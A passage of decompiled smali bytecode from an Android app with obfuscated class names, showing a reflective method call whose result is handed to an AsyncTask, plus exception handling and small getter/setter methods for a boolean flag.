    move-result-object v1

    check-cast v1, Ljava/lang/Integer;

    invoke-virtual {v1}, Ljava/lang/Integer;->intValue()I

    move-result v1

    iput v1, v0, Lwvknbzh/mwrpxg/qpha/h$a;->d:I

    .line 156
    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v8, 0xb

    if-lt v1, v8, :cond_d

    .line 157
    sget-object v1, Landroid/os/AsyncTask;->THREAD_POOL_EXECUTOR:Ljava/util/concurrent/Executor;

    const/4 v8, 0x1

    new-array v8, v8, [Ljava/lang/Object;

    const/4 v9, 0x0

    const/4 v10, 0x1

    new-array v10, v10, [Ljava/lang/Object;

    const/4 v11, 0x0

    sget-object v12, Lwvknbzh/mwrpxg/qpha/a;->an:Ljava/lang/String;

    aput-object v12, v10, v11

    invoke-virtual {v7, v6, v10}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v6

    aput-object v6, v8, v9

    invoke-virtual {v0, v1, v8}, Lwvknbzh/mwrpxg/qpha/h$a;->executeOnExecutor(Ljava/util/concurrent/Executor;[Ljava/lang/Object;)Landroid/os/AsyncTask;

    goto :goto_4

    .line 165
    :catch_0
    move-exception v0

    :cond_b
    move v1, v2

    :cond_c
    :goto_5
    move v0, v1

    :goto_6
    move v1, v0

    .line 177
    goto/16 :goto_0

    .line 159
    :cond_d
    const/4 v1, 0x1

    new-array v1, v1, [Ljava/lang/Object;

    const/4 v8, 0x0

    const/4 v9, 0x1

    new-array v9, v9, [Ljava/lang/Object;

    const/4 v10, 0x0

    sget-object v11, Lwvknbzh/mwrpxg/qpha/a;->an:Ljava/lang/String;

    aput-object v11, v9, v10

    invoke-virtual {v7, v6, v9}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v6

    aput-object v6, v1, v8

    invoke-virtual {v0, v1}, Lwvknbzh/mwrpxg/qpha/h$a;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;
    :try_end_6
    .catch Ljava/lang/Throwable; {:try_start_6 .. :try_end_6} :catch_0

    goto/16 :goto_4

    .line 173
    :catch_1
    move-exception v0

    .line 174
    invoke-static {v0}, Lwvknbzh/mwrpxg/qpha/c;->a(Ljava/lang/Throwable;)V

    move v0, v1

    goto :goto_6

    .line 179
    :cond_e
    sput-boolean v1, Lwvknbzh/mwrpxg/qpha/h;->h:Z

    .line 181
    return-void

    .line 169
    :catch_2
    move-exception v0

    goto :goto_5

    :catch_3
    move-exception v0

    move v1, v2

    goto :goto_5

    .line 113
    :catch_4
    move-exception v2

    goto/16 :goto_1
.end method

.method a(Z)V
    .locals 0

    .prologue
    .line 87
    iput-boolean p1, p0, Lwvknbzh/mwrpxg/qpha/h;->g:Z

    .line 88
    return-void
.end method

.method b()Z
    .locals 1

    .prologue
    .line 91
    iget-boolean v0, p0, Lwvknbzh/mwrpxg/qpha/h;->g:Z

    return v0
.end method
